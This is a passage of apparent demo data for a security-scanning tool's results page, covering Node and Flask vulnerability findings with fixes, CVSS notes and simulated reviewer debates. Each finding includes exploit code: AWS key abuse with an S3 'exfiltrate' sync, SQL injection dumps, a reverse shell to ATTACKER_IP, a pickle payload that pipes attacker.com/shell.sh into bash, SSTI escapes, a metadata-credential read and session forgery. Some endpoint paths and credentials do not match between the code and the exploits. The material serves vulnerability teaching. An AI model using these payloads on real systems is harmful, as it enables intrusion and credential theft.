aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

# Enumerate accessible resources
aws s3 ls                          # List all S3 buckets
aws ec2 describe-instances         # List EC2 instances
aws iam list-users                 # List IAM users (if permitted)

# Exfiltrate sensitive S3 data
aws s3 sync s3://app-backups /tmp/stolen-data/`,
            attackPath: `1. Attacker finds AWS keys in config/secrets.js via git history or current code
2. Configures AWS CLI with extracted access key and secret
3. Enumerates accessible AWS services and resources
4. Exfiltrates S3 bucket contents (backups, user data, logs)
5. May create new IAM users or persist access via EC2 backdoors
6. Potential for significant financial damage via resource abuse`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "AKIA... key literal", description: "AWS access key hardcoded in config/secrets.js" },
                    { id: "n2", type: "intermediate", label: "AWS SDK / CLI", description: "Credentials used to authenticate against AWS APIs" },
                    { id: "n3", type: "sink", label: "AWS cloud resources", description: "S3, EC2, IAM, and other services accessible with these keys" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "stolen" },
                    { from: "n2", to: "n3", label: "cloud access" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Live AWS access keys in source control. GitHub secret scanners flag these automatically. Damage window starts from first commit." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Key permissions might be scoped to minimal access." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Scope is unknown and keys must be rotated immediately regardless. Even minimal permissions enable reconnaissance. Confirmed Critical.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
        {
            id: "demo-vuln-15",
            severity: "Critical",
            title: "Hardcoded JWT Secret",
            cweId: "CWE-798",
            lineNumber: 5,
            confidence: 0.99,
            cvssScore: 9.8,
            explanation: "The JWT secret is stored alongside other secrets in a committed configuration file.",
            bestPractices: "Move all secrets to environment variables or a dedicated secrets management service.",
            details: "JWT signing secret in committed config file",
            vulnerableCode: `// config/secrets.js — lines 1-6
// VULNERABLE: Secrets in source code
module.exports = {
    AWS_ACCESS_KEY: 'AKIA_EXAMPLE_KEY_HERE',
    AWS_SECRET_KEY: 'example_secret_key_replace_me_in_production',
    JWT_SECRET: 'super-secret-jwt-key-do-not-share'
};`,
            exploitExamples: `# Proof of Concept — JWT Forgery from config/secrets.js (CWE-798)
# Secret found: config/secrets.js line 5

const jwt = require('jsonwebtoken');
// Forge admin token using extracted secret
const token = jwt.sign(
  { sub: 1, role: 'admin', iat: Math.floor(Date.now()/1000) },
  extractedSecret,
  { algorithm: 'HS256', expiresIn: '30d' }
);`,
            attackPath: `1. config/secrets.js contains both AWS keys and JWT secret
2. Single file compromise yields multiple critical secrets
3. Attacker forges admin JWT using extracted secret
4. Simultaneously abuses AWS credentials for cloud resource access
5. Combined impact: application takeover + cloud infrastructure access`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "config/secrets.js", description: "Aggregated secrets file committed to version control" },
                    { id: "n2", type: "intermediate", label: "jwt.sign(adminPayload, secret)", description: "Forged token created with extracted JWT secret" },
                    { id: "n3", type: "sink", label: "authenticated API session", description: "Admin privileges granted via forged token" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "extracted secret" },
                    { from: "n2", to: "n3", label: "auth bypass" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Centralised secrets file is the worst pattern — single breach yields all credentials simultaneously." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Duplicate finding with demo-vuln-13 if the same secret is used." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Even if the secret is the same, this file amplifies exposure surface. Confirmed Critical — both findings require remediation.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
};


// =============================================
// DEMO VULNERABILITIES PER REPO (for Results page)
// =============================================
const DEMO_VULNERABILITIES_FLASK = {
    "app/routes.py": [
        {
            id: "flask-vuln-1",
            severity: "Critical",
            title: "SQL Injection",
            cweId: "CWE-89",
            lineNumber: 10,
            confidence: 0.98,
            cvssScore: 9.8,
            vulnerableCode: `# app/routes.py — lines 7-11
@app.route('/api/users/search')
def search_users():
    query = request.args.get('q', '')
    # SQL Injection
    result = db.engine.execute(f"SELECT * FROM users WHERE name LIKE '%{query}%'")
    return jsonify([dict(row) for row in result])`,
            explanation: "User input from `request.args.get('q')` is directly interpolated into the SQL query using an f-string. An attacker can inject arbitrary SQL to read, modify, or delete the entire database.",
            bestPractices: "Use SQLAlchemy ORM queries with parameterised filters: `User.query.filter(User.name.like(f'%{query}%'))` or use `db.engine.execute(text(...), {'q': query})`.",
            details: "SQL Injection via f-string interpolation in raw SQL query",
            cvssVector: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
            cvssAnalysis: {
                AV: "The /search endpoint is exposed over the network with no access control. Any internet-facing deployment allows unauthenticated access to the injection point.",
                AC: "Exploitation requires only knowledge of the endpoint. A single HTTP request with a crafted `q` parameter is sufficient.",
                AT: "No prerequisites. The attacker does not need an existing session, specific data state, or race conditions.",
                PR: "The search route requires no authentication — anyone can trigger the injection.",
                UI: "Fully automated attack — no victim interaction needed.",
                VC: "All data accessible to the DB user can be read: user table, hashed passwords, emails, session tokens, and any business data.",
                VI: "An attacker can INSERT, UPDATE, or DELETE any row — including creating admin accounts or wiping data.",
                VA: "Destructive SQL (DROP TABLE, TRUNCATE) can permanently destroy application data.",
            },
            documentReferences: [
                {
                    documentTitle: "SQLAlchemy Security Documentation — Avoiding SQL Injection",
                    pageNumber: 4,
                    relevantExcerpt: "Never use Python string formatting or f-strings to interpolate user-supplied values into SQL. Use bound parameters: `session.execute(text('SELECT * FROM users WHERE name LIKE :q'), {'q': f'%{query}%'})`",
                    relevanceNote: "This is the exact SQLAlchemy fix for the vulnerable `db.engine.execute()` pattern at line 10.",
                },
                {
                    documentTitle: "OWASP Testing Guide v4.2 — SQL Injection (OTG-INPVAL-005)",
                    pageNumber: 17,
                    relevantExcerpt: "Test with a single quote character (') — if a database error is returned, the application is likely vulnerable. Union-based injection can then be used to extract data from other tables.",
                    relevanceNote: "Confirms the attack technique applicable to this endpoint. The single-quote injection is confirmed via Flask's debug error output.",
                },
            ],
            exploitSections: [
                {
                    heading: "Detection — Confirm Injection",
                    text: "A single quote in the `q` parameter breaks the SQL syntax and returns a database error, confirming unsanitized input.",
                    code: `# Confirm injection with single quote
curl "http://localhost:5000/search?q='"
# Expected: 500 error with SQL syntax error in response

# Boolean-based confirmation — should return all users
curl "http://localhost:5000/search?q=' OR '1'='1"`,
                    language: "bash",
                },
                {
                    heading: "Schema Enumeration — UNION SELECT",
                    text: "Use UNION SELECT to read from `information_schema.tables` and enumerate the full database schema.",
                    code: `# Get number of columns first
curl "http://localhost:5000/search?q=' ORDER BY 1--+-"  # try 1,2,3...
curl "http://localhost:5000/search?q=' ORDER BY 3--+-"  # 3 works → 3 columns

# Enumerate tables
curl "http://localhost:5000/search?q=' UNION SELECT table_name,2,3 FROM information_schema.tables-- -"`,
                    language: "bash",
                },
                {
                    heading: "Data Exfiltration — Dump Users",
                    text: "With the schema known, dump the `users` table to obtain credentials.",
                    code: `# Dump users table
curl "http://localhost:5000/search?q=' UNION SELECT username,password_hash,email FROM users-- -"

# Response:
# [
#   {"name": "admin", "2": "$2b$12$hash...", "3": "admin@company.com"},
#   {"name": "user1", "2": "$2b$12$hash...", "3": "user1@company.com"}
# ]`,
                    language: "bash",
                },
            ],
            attackPath: `1. Attacker finds /search endpoint with q parameter
2. Injects ' OR 1=1-- to confirm vulnerability
3. Uses UNION SELECT to enumerate database schema
4. Dumps users table including password hashes
5. Cracks hashes offline and authenticates as admin`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "request.args.get('q')", description: "URL query parameter, fully attacker-controlled" },
                    { id: "n2", type: "intermediate", label: "f-string interpolation", description: "f\"SELECT * FROM users WHERE name LIKE '%{query}%'\"" },
                    { id: "n3", type: "sink", label: "db.engine.execute()", description: "Injected SQL string executed directly against database" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "interpolated" },
                    { from: "n2", to: "n3", label: "injected" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.98,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "f-string interpolation of user input into raw SQL is the canonical SQL injection pattern. Flask/SQLAlchemy provides parameterised queries but they are not used here." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Flask's request object may apply some baseline sanitisation." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Flask's request object performs no SQL sanitisation — that is not its purpose. Confirmed Critical.", verdict: "confirmed", confidence: 0.98 },
                ],
            },
        },
        {
            id: "flask-vuln-2",
            severity: "Critical",
            title: "OS Command Injection",
            cweId: "CWE-78",
            lineNumber: 16,
            confidence: 0.97,
            cvssScore: 9.8,
            vulnerableCode: `# app/routes.py — lines 13-17
@app.route('/api/ping')
def ping():
    host = request.args.get('host', 'localhost')
    # Command Injection
    output = subprocess.check_output(f'ping -c 1 {host}', shell=True)
    return output`,
            explanation: "The `host` parameter from user input is directly passed into `subprocess.check_output` with `shell=True`. An attacker can chain commands with `;`, `&&`, or `|` to execute arbitrary system commands.",
            bestPractices: "Use `subprocess.run(['ping', '-c', '1', host], shell=False)` and validate the host against a strict allowlist or regex pattern.",
            details: "Command Injection via unsanitised subprocess call with shell=True",
            cvssVector: "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
            cvssAnalysis: {
                AV: "The /ping endpoint is accessible over the network. No authentication or special network position is required to reach the injection point.",
                AC: "Exploitation is trivial — a semicolon followed by any shell command is sufficient. No timing, race conditions, or special knowledge needed.",
                AT: "No prerequisites. The attack works on any OS where bash or sh is available (Linux/macOS) or cmd/powershell (Windows).",
                PR: "The endpoint is unauthenticated — no privilege is required to send the malicious host parameter.",
                UI: "Fully automated — no victim interaction is required.",
                VC: "Full system-level confidentiality loss: `/etc/shadow`, application source, all environment variables, and any secrets on the filesystem.",
                VI: "The attacker has full write access — can create/modify/delete files, install backdoors, and add cron jobs.",
                VA: "Can kill all processes, fill disk, or corrupt application data — full denial of service.",
                SC: "The web process credentials can be used to pivot to databases, internal services, and cloud metadata endpoints.",
                SI: "Full integrity loss across connected systems — can write SSH keys, modify code, or tamper with logs.",
                SA: "Can stop or crash all services on the host and connected infrastructure.",
            },
            documentReferences: [
                {
                    documentTitle: "Python subprocess Security Guide — Avoiding shell=True",
                    pageNumber: 2,
                    relevantExcerpt: "Never pass shell=True with user-controlled input. Use a list of arguments instead: subprocess.run(['ping', '-c', '1', host], shell=False). This prevents shell metacharacter injection entirely.",
                    relevanceNote: "Direct fix for the subprocess.check_output(shell=True) pattern at line 16.",
                },
            ],
            exploitSections: [
                {
                    heading: "RCE Confirmation — Command Chaining",
                    text: "Chain a semicolon after a valid host to inject an additional OS command. The server executes both commands and returns combined output.",
                    code: `# Basic RCE — chain 'id' command
curl "http://localhost:5000/ping?host=127.0.0.1;id"

# Expected output:
# PING 127.0.0.1 ... 64 bytes from 127.0.0.1 ...
# uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
                    language: "bash",
                },
                {
                    heading: "Reverse Shell — Interactive Access",
                    text: "Establish a persistent interactive shell on the target server using a bash TCP redirect.",
                    code: `# Attacker: start listener
nc -lnvp 4444

# Exploit: send reverse shell payload
curl "http://localhost:5000/ping?host=127.0.0.1;bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"

# Attacker receives shell:
# bash-5.1$ whoami
# www-data
# bash-5.1$ cat /etc/passwd`,
                    language: "bash",
                },
                {
                    heading: "Secret Exfiltration — Environment & Config",
                    text: "Read application secrets, database credentials, and cloud tokens from the process environment.",
                    code: `# Read environment variables (DB credentials, API keys)
curl "http://localhost:5000/ping?host=127.0.0.1;env"

# Read .env file
curl "http://localhost:5000/ping?host=127.0.0.1;cat+../.env"

# Read cloud metadata (AWS/GCP/Azure)
curl "http://localhost:5000/ping?host=127.0.0.1;curl+http://169.254.169.254/latest/meta-data/iam/security-credentials/"`,
                    language: "bash",
                },
            ],
            attackPath: `1. Attacker discovers /ping?host= endpoint
2. Injects semicolon: host=127.0.0.1;id — server executes both commands
3. Escalates to reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1
4. Obtains interactive shell as the web process user
5. Reads /etc/shadow, application secrets, database credentials
6. Pivots to full server compromise`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "request.args.get('host')", description: "User-supplied host parameter" },
                    { id: "n2", type: "intermediate", label: "f'ping -c 1 {host}'", description: "Command string assembled with unvalidated user input" },
                    { id: "n3", type: "sink", label: "subprocess.check_output(shell=True)", description: "OS shell executes attacker-injected commands" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "interpolated" },
                    { from: "n2", to: "n3", label: "shell=True RCE" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.97,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "shell=True with unsanitised user input is a direct path to RCE. This is one of the most dangerous vulnerability patterns possible." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The application might run in a sandboxed container limiting blast radius." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Container or not, RCE grants reading of all application secrets and lateral movement possibilities. Confirmed Critical.", verdict: "confirmed", confidence: 0.97 },
                ],
            },
        },
        {
            id: "flask-vuln-3",
            severity: "Critical",
            title: "Insecure Deserialization",
            cweId: "CWE-502",
            lineNumber: 23,
            confidence: 0.96,
            cvssScore: 9.8,
            vulnerableCode: `# app/routes.py — lines 20-24
@app.route('/api/session', methods=['POST'])
def load_session():
    data = request.get_data()
    # Insecure Deserialization
    session_data = pickle.loads(data)
    return jsonify(session_data)`,
            explanation: "`pickle.loads()` on untrusted user input can execute arbitrary code. An attacker can craft a malicious pickle payload to achieve remote code execution.",
            bestPractices: "Never use `pickle` to deserialize untrusted data. Use JSON for data interchange and validate input schema with libraries like Pydantic or Marshmallow.",
            details: "Arbitrary code execution via pickle deserialization of user input",
            exploitExamples: `# Proof of Concept — Pickle RCE (CWE-502)
import pickle, base64, os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl https://attacker.com/shell.sh | bash',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()

# Send payload to the vulnerable endpoint
import requests
requests.post('http://localhost:5000/deserialize',
    data={'data': payload})
# Server executes: curl https://attacker.com/shell.sh | bash`,
            attackPath: `1. Attacker identifies endpoint accepting base64-encoded serialized data
2. Crafts malicious pickle payload with __reduce__ method override
3. Payload encodes an os.system() call to a reverse shell
4. Server deserializes payload — os.system() called during unpickling
5. Attacker receives reverse shell with web process privileges`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "request.data (base64)", description: "Attacker-crafted serialized pickle payload via HTTP body" },
                    { id: "n2", type: "intermediate", label: "base64.b64decode()", description: "Decodes attacker payload to raw bytes" },
                    { id: "n3", type: "sink", label: "pickle.loads()", description: "Deserializes payload — arbitrary Python code executed" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "decoded" },
                    { from: "n2", to: "n3", label: "RCE via __reduce__" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.96,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "pickle.loads() on untrusted input is documented as allowing arbitrary code execution — Python docs explicitly warn against this." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The endpoint might require authentication, limiting who can trigger deserialization." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Authentication does not prevent insecure deserialization — any authenticated user can exploit it. Confirmed Critical.", verdict: "confirmed", confidence: 0.96 },
                ],
            },
        },
        {
            id: "flask-vuln-4",
            severity: "High",
            title: "Server-Side Template Injection (SSTI)",
            cweId: "CWE-1336",
            lineNumber: 30,
            confidence: 0.94,
            cvssScore: 8.8,
            vulnerableCode: `# app/routes.py — lines 27-32
@app.route('/api/greeting')
def greeting():
    name = request.args.get('name', 'World')
    # SSTI
    template = f'<h1>Hello {name}!</h1>'
    return render_template_string(template)`,
            explanation: "User input is directly embedded into a Jinja2 template string via `render_template_string`. An attacker can inject template expressions like `{{7*7}}` or `{{config}}` to read secrets or achieve RCE.",
            bestPractices: "Pass user input as a template variable: `render_template_string('<h1>Hello {{name}}!</h1>', name=name)`. Never concatenate user input into template strings.",
            details: "SSTI via unescaped user input in render_template_string",
            exploitExamples: `# Proof of Concept — Flask SSTI (CWE-1336)
# Target: GET /greet?name=<payload>

# 1. Confirm template evaluation
curl "http://localhost:5000/greet?name={{7*7}}"
# Response: Hello 49!  ← template evaluated

# 2. Read Flask secret key
curl "http://localhost:5000/greet?name={{config.SECRET_KEY}}"

# 3. RCE via MRO traversal (Jinja2 sandbox escape)
curl "http://localhost:5000/greet?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}"`,
            attackPath: `1. Attacker sends {{7*7}} as name parameter — response shows 49
2. Confirms Jinja2 SSTI — template engine evaluates input
3. Reads config.SECRET_KEY — can forge Flask session cookies
4. Uses MRO traversal to escape sandbox and achieve RCE
5. Arbitrary server-side code execution as web process`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "request.args.get('name')", description: "User input injected into template" },
                    { id: "n2", type: "intermediate", label: "f'Hello {name}!'", description: "String interpolation before passing to template engine" },
                    { id: "n3", type: "sink", label: "render_template_string()", description: "Jinja2 evaluates attacker-controlled template expressions" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "concatenated" },
                    { from: "n2", to: "n3", label: "template evaluated" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.94,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "render_template_string() with user-controlled input is the canonical SSTI vector in Flask. Jinja2 sandbox escape to RCE is well-documented." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Jinja2's sandbox mode might prevent the most dangerous payloads." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Flask does not use Jinja2's sandbox mode by default. Secret key exposure alone is High severity. RCE escalates this to Critical in practice. Confirmed High.", verdict: "confirmed", confidence: 0.94 },
                ],
            },
        },
    ],
    "app/__init__.py": [
        {
            id: "flask-vuln-5",
            severity: "High",
            title: "Debug Mode Enabled in Production",
            cweId: "CWE-489",
            lineNumber: 6,
            confidence: 0.99,
            cvssScore: 7.5,
            vulnerableCode: `# app/__init__.py — lines 1-9
from flask import Flask
from flask_sqlalchemy import SQLAlchemy

app = Flask(__name__)
app.config['DEBUG'] = True
app.config['SECRET_KEY'] = 'dev'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///production.db'

db = SQLAlchemy(app)`,
            explanation: "Flask debug mode (`DEBUG = True`) exposes a Werkzeug interactive debugger that allows arbitrary code execution if accessed remotely.",
            bestPractices: "Set `DEBUG = False` in production. Use environment variables: `app.config['DEBUG'] = os.environ.get('FLASK_DEBUG', 'False') == 'True'`.",
            details: "Debug mode enabled, exposing interactive debugger",
            exploitExamples: `# Proof of Concept — Werkzeug Debug Console RCE (CWE-489)
# Trigger an error to access the interactive debugger
curl http://localhost:5000/cause-error

# The Werkzeug debugger appears in the browser at the error page
# Each traceback frame has a console icon — click to open Python REPL

# In the debugger console:
>>> import os; os.system('id')
uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)

>>> open('/etc/passwd').read()`,
            attackPath: `1. Attacker triggers any unhandled exception on the Flask app
2. Werkzeug debug page renders with interactive Python console per frame
3. Debugger requires a PIN — but PIN can be calculated from server info
4. Execute arbitrary Python: read files, spawn shells, access DB
5. Full server compromise through the debugger console`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "DEBUG = True", description: "Debug flag enables Werkzeug interactive debugger" },
                    { id: "n2", type: "intermediate", label: "unhandled exception", description: "Any 500 error triggers the debugger interface" },
                    { id: "n3", type: "sink", label: "Werkzeug Python REPL", description: "Interactive Python console exposed over HTTP" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "enables" },
                    { from: "n2", to: "n3", label: "RCE console" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Flask docs explicitly state: never run debug mode in production. Werkzeug debugger provides an interactive Python REPL accessible over HTTP." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The debugger PIN provides some protection against unauthenticated access." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "The PIN is calculable from server metadata and provides weak protection. This is a well-known attack. Confirmed High.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
        {
            id: "flask-vuln-6",
            severity: "Critical",
            title: "Hardcoded Secret Key",
            cweId: "CWE-798",
            lineNumber: 7,
            confidence: 0.99,
            cvssScore: 9.1,
            vulnerableCode: `# app/__init__.py — line 7
app.config['SECRET_KEY'] = 'dev'`,
            explanation: "The Flask SECRET_KEY is hardcoded as `'dev'`. This key is used for session signing — a known secret allows session forgery and cookie tampering.",
            bestPractices: "Generate a strong random key and store it in an environment variable: `app.config['SECRET_KEY'] = os.environ['SECRET_KEY']`.",
            details: "Hardcoded Flask SECRET_KEY enables session forgery",
            exploitExamples: `# Proof of Concept — Flask Session Forgery (CWE-798)
# SECRET_KEY = 'dev' found in app/__init__.py

pip install flask-unsign

# Decode existing session cookie
flask-unsign --decode --cookie "eyJ1c2VyX2lkIjoxfQ..."

# Forge admin session cookie
flask-unsign --sign --cookie "{'user_id': 1, 'is_admin': True}" --secret 'dev'
# Output: eyJ1c2VyX2lkIjoxLCJpc19hZG1pbiI6dHJ1ZX0...

# Use forged cookie
curl http://localhost:5000/admin \\
  -H "Cookie: session=<forged_cookie>"`,
            attackPath: `1. Attacker extracts SECRET_KEY='dev' from source code
2. Uses flask-unsign to decode any existing session cookie
3. Modifies session payload: is_admin=True, user_id=1
4. Re-signs with known secret — server validates successfully
5. Admin session established without valid credentials`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "SECRET_KEY = 'dev'", description: "Known signing secret in app/__init__.py" },
                    { id: "n2", type: "intermediate", label: "flask-unsign forge", description: "Attacker crafts arbitrary session payload and signs it" },
                    { id: "n3", type: "sink", label: "Flask session verification", description: "Forged cookie validated — admin session established" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "known secret" },
                    { from: "n2", to: "n3", label: "forged session" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "SECRET_KEY='dev' is the Flask tutorial default. flask-unsign can forge any session cookie with this key in seconds." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "No argument — this is unambiguously exploitable." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Unanimous. Confirmed Critical.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
    "app/models.py": [
        {
            id: "flask-vuln-7",
            severity: "High",
            title: "Weak Password Hashing (MD5)",
            cweId: "CWE-328",
            lineNumber: 14,
            confidence: 0.99,
            cvssScore: 7.5,
            vulnerableCode: `# app/models.py — lines 12-15
    def set_password(self, password):
        # VULNERABLE: Weak hash
        self.password_hash = generate_password_hash(password, method='md5')`,
            explanation: "Passwords are hashed with MD5 via `generate_password_hash(password, method='md5')`. MD5 is cryptographically broken and susceptible to rainbow table and collision attacks.",
            bestPractices: "Use `generate_password_hash(password, method='scrypt')` (default in Werkzeug) or use bcrypt/argon2 via `passlib`.",
            details: "MD5 used for password hashing instead of modern KDF",
            exploitExamples: `# Proof of Concept — Flask MD5 Password Cracking (CWE-328)
# Extract hashes via SQL injection on /search endpoint
# Example: md5:5f4dcc3b5aa765d61d8327deb882cf99

# Strip the "md5:" prefix and crack with hashcat
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
# Speed: ~10 billion hashes/sec — most passwords crack in seconds

# Alternatively, CrackStation.net — instant for common passwords`,
            attackPath: `1. Attacker obtains password hashes via SQL injection on /search
2. Identifies "md5:" prefix in Werkzeug-formatted hashes
3. Strips prefix and submits to CrackStation.net
4. ~80% of real-world passwords crack immediately
5. Runs hashcat with GPU for remaining hashes
6. Authenticates as cracked users`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "password (plaintext)", description: "User password during registration" },
                    { id: "n2", type: "intermediate", label: "generate_password_hash(method='md5')", description: "Werkzeug MD5 hash — no work factor" },
                    { id: "n3", type: "sink", label: "users.password_hash column", description: "Weak MD5 hash stored — instantly crackable" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "MD5 hashed" },
                    { from: "n2", to: "n3", label: "stored" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Werkzeug's own documentation warns against using method='md5' since version 2.0. scrypt is the default for a reason." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Werkzeug adds a salt prefix — does that help?" },
                    { id: "r3", round: 3, agentRole: "judge", argument: "The salt is stored alongside the hash, making per-hash cracking straightforward. MD5 work factor is negligible. Confirmed High.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
        {
            id: "flask-vuln-8",
            severity: "Medium",
            title: "Sensitive Data Exposure in API Response",
            cweId: "CWE-200",
            lineNumber: 17,
            confidence: 0.91,
            cvssScore: 5.3,
            vulnerableCode: `# app/models.py — lines 17-24
    def to_dict(self):
        # VULNERABLE: Exposes password_hash
        return {
            'id': self.id,
            'username': self.username,
            'email': self.email,
            'password_hash': self.password_hash
        }`,
            explanation: "The `to_dict()` method exposes `password_hash` and `is_admin` fields in API responses, leaking sensitive internal data.",
            bestPractices: "Exclude sensitive fields from serialization. Return only necessary fields: `{'id': self.id, 'username': self.username, 'email': self.email}`.",
            details: "Password hash and admin flag exposed in API response",
            exploitExamples: `# Proof of Concept — Sensitive Data Exposure (CWE-200)
# Any authenticated user can see other users' sensitive fields

curl http://localhost:5000/api/users/2 \\
  -H "Authorization: Bearer <valid_token>"

# Response includes:
# {
#   "id": 2,
#   "username": "alice",
#   "email": "alice@example.com",
#   "password_hash": "md5:5f4dcc3b5aa765d61d8327deb882cf99",
#   "is_admin": false
# }

# password_hash enables offline cracking`,
            attackPath: `1. Attacker authenticates with any valid user account
2. Queries /api/users/<id> for each user ID (IDOR also present)
3. Collects password_hash and is_admin for all users
4. Identifies admin accounts via is_admin=true
5. Cracks admin password hashes offline
6. Authenticates as admin`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "User.to_dict()", description: "Serializer includes all model fields including sensitive ones" },
                    { id: "n2", type: "intermediate", label: "jsonify(user.to_dict())", description: "Full dict including password_hash serialized to JSON" },
                    { id: "n3", type: "sink", label: "HTTP response body", description: "password_hash and is_admin exposed to API callers" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "over-serialized" },
                    { from: "n2", to: "n3", label: "leaked in response" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.91,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Exposing password_hash in API responses is a direct information disclosure enabling offline cracking attacks." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The endpoint might be restricted to admin users only." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "No authorization check on this endpoint was found. Even if restricted, admin fields should not be serialized. Confirmed Medium.", verdict: "confirmed", confidence: 0.91 },
                ],
            },
        },
    ],
    "config.py": [
        {
            id: "flask-vuln-9",
            severity: "Critical",
            title: "Hardcoded Database Credentials",
            cweId: "CWE-798",
            lineNumber: 5,
            confidence: 0.99,
            cvssScore: 9.1,
            vulnerableCode: `# config.py — lines 1-6
class Config:
    SECRET_KEY = 'super-secret-flask-key'
    SQLALCHEMY_DATABASE_URI = 'postgresql://admin:password123@localhost/production'
    DEBUG = True
    WTF_CSRF_ENABLED = False`,
            explanation: "Database connection string with credentials is hardcoded in the configuration file.",
            bestPractices: "Use environment variables for database URIs: `SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL')`.",
            details: "Database credentials committed to source control",
            exploitExamples: `# Proof of Concept — Hardcoded DB Connection String (CWE-798)
# Found in config.py:
# SQLALCHEMY_DATABASE_URI = "postgresql://admin:dbpass123@db.internal/appdb"

# Direct database connection using extracted credentials
psql postgresql://admin:dbpass123@db.internal/appdb

# Dump all data
pg_dump postgresql://admin:dbpass123@db.internal/appdb > full_dump.sql`,
            attackPath: `1. Attacker reads config.py from repository
2. Extracts connection string: postgresql://admin:dbpass123@...
3. Connects directly to database server with extracted credentials
4. Full read/write access to all application data
5. Exfiltrates user records, session data, application state`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "connection string literal", description: "Full DB URI with credentials hardcoded in config.py" },
                    { id: "n2", type: "intermediate", label: "SQLAlchemy engine", description: "DB driver connects using hardcoded URI" },
                    { id: "n3", type: "sink", label: "PostgreSQL server", description: "Full database access with hardcoded admin credentials" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "embedded" },
                    { from: "n2", to: "n3", label: "authenticated" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Full database URI with credentials in config.py — trivially extractable from any repository access." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Database port might not be publicly exposed." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Internal exposure enables insider threat and post-compromise lateral movement. Confirmed Critical.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
